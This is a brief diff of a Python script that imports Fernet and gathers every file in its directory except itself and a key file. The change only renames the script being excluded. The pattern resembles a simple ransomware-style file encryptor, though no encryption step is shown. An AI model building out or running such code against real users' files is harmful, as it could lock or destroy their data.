@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for  file in os.listdir():
-	if file == "kiw.py" or file == "kunci.key":
+	if file == "Encrypt.py" or file == "kunci.key":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
